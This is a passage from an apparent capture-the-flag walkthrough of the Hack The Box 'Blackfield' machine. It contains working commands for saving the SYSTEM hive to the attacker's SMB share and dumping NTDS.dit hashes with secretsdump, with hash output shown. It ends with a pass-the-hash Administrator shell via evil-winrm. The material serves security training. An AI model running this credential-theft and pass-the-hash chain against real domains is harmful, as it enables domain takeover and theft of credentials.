```powershell
*Evil-WinRM* PS C:\\programdata> reg.exe save hklm\\system \\\\10.10.17.5\\s\\system
The operation completed successfully.

```

#### Cleanup

Run the cleanup script to remove the shadow copy:

```powershell
*Evil-WinRM* PS C:\\programdata> diskshadow /s c:\\programdata\\cleanup.dsh

```

### Dumping Domain Hashes

#### Using [secretsdump.py](http://secretsdump.py)

With both the NTDS.dit and SYSTEM files, we can now dump all domain password hashes:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ secretsdump.py -system system -ntds ntds.dit LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
BLACKFIELD.local\\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
BLACKFIELD.local\\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
...[snip]...

```

**Perfect!** We now have the Administrator's NTLM hash: `184fb5e5178480be64824d4cd53b99ee`

### Getting Administrator Shell

#### Pass-the-Hash with Evil-WinRM

Use the Administrator's hash to get a shell via Pass-the-Hash:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Blackfield]
└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>

```

**Success!** We now have Administrator access.

#### Retrieving the Root Flag

```powershell
*Evil-WinRM* PS C:\\Users\\Administrator\\desktop> cat root.txt
4375a629************************

```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
